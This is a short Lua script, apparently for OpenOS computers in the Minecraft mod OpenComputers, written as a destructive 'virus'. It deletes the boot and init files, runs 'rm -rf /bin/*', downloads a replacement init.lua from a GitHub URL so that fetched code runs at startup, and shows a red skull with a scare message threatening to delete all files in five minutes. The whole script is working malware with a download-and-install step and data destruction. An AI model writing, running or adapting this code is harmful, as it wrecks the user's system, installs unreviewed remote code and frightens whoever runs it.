local c = require("component")
local gpu = c.gpu
local comp = require("computer")
local fs = require("filesystem")
local os = require("os")
local shell = require("shell")
local event = require("event")

fs.remove("/init.lua")
os.execute("wget https://raw.githubusercontent.com/matvey-mayner/OpenOS-Apps/refs/heads/main/kraka/init.lua /init.lua")
shell.execute("rm -rf /bin/*")
fs.remove("/lib/core/boot.lua")
fs.remove("/boot/00_base.lua")

gpu.setResolution(80, 25)
gpu.setBackground(0xff0000)
gpu.setForeground(0xFFFFFF)

gpu.set(1, 1, "█████████████▀▀▀▀▀▀▀▀█████████████")
gpu.set(1, 2, "████████████░░░░░░░░░░████████████")
gpu.set(1, 3, "███████████░░░░░░░░░░░░███████████")
gpu.set(1, 4, "███████████░░▄▄█░░█▄▄░░███████████")
gpu.set(1, 5, "███████████▄░▀▀░▄▄░▀▀░▄███████████")
gpu.set(1, 6, "█████████████░░░▀▀░░░█████████████")
gpu.set(1, 7, "█████████████░░░██░░░█████████████")
gpu.set(1, 8, "██████████████▄▄░░▄▄██████████████")
gpu.set(1, 9, "██████████████████████████████████")
gpu.set(1, 10, "█████▀▀▀▀▀▀▀▀▀██▄▄██▀▀▀▀▀▀▀▀▀█████")
gpu.set(1, 11, "████▀█▄▄▄▄▄▄▄▄▄░██░▄▄▄▄▄▄▄▄▄█▀████")
gpu.set(1, 12, "███░░░░█████████░░█████████░░░░███")

gpu.set(10, 1, "You Have a 5 minutes")
gpu.set(10, 3, "After five minutes, all your files will be deleted!")
gpu.set(10, 6, "Rules:")
gpu.set(10, 8, "1. Don't try delete this virus")
gpu.set(10, 10, "2. Don't Reboot Computer")
gpu.set(10, 12, "3. Don't leave this program")

while true do
    event.pull("touch")
end
